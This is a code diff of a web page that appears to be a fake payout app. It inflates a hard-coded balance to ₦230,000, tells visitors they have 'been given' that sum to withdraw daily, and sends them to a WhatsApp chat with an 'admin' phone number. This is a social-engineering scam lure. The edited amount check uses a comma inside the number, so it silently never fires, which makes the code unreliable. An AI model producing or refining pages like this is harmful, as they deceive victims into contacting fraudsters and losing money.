@@ -303,7 +303,7 @@
 
         <p>Select an account</p>
         <div class="account-card">
-<div class="balance">₦25,675.00</div>
+<div class="balance">₦230,000.00</div>
 <div class="card-details">**** **** **** <span id="randomCardNumber"></span></div>
 <div class="expiry-date">Expiry Date: <span id="expiryMonth"></span>/<span id="expiryYear"></span></div>
 <div class="card-icon">
@@ -382,12 +382,12 @@
                <div class="popup" style="width: 280px;">
                  <button class="close-btn" id="closePopup" style="margin-top: 0; margin-bottom: 0;">X</button>
                  <h2 style=" padding-top: 32px; padding-bottom: 0px; color: #fff;">Welcome!</h2>
-                 <p>you have been given <span style="color: green; font-weight: bold;">₦25,675</span> to
+                 <p>you have been given <span style="color: green; font-weight: bold;">₦230,000</span> to
                    withdraw every day.
                    <br>
-                  <span style="color: blue;"> Click the button below to join our Whatsapp Channel</span>
+                  <span style="color: blue;"> Click the button below to chat the app admin</span>
                  </p>
-                 <button class="redirect-btn" id="redirectBtn">Join Whatsapp</button>
+                 <button class="redirect-btn" id="redirectBtn">Chat Admin</button>
           </div>
     </div>
 
@@ -434,7 +434,7 @@ document.getElementById("closePopup").onclick = function() {
 };
 
 document.getElementById("redirectBtn").onclick = function() {
-  window.location.href = "https://chat.whatsapp.com/It3LEjwraG4KVPfMx5WTz0";
+  window.location.href = "https://wa.me/+2349124756194";
 };
 
 document.getElementById('checkAmount').addEventListener('click', function() {
@@ -444,7 +444,7 @@ document.getElementById('checkAmount').addEventListener('click', function() {
 
   if (accountName === "" || accountNumber === "" || amount === "") {
     alert('Please fill out all fields.');
-  } else if (parseFloat(amount) > 25675) {
+  } else if (parseFloat(amount) > 230,000) {
     alert('Amount Exceeded on your dashboard');
   } else {
     document.getElementById('pop2').style.display = 'flex';
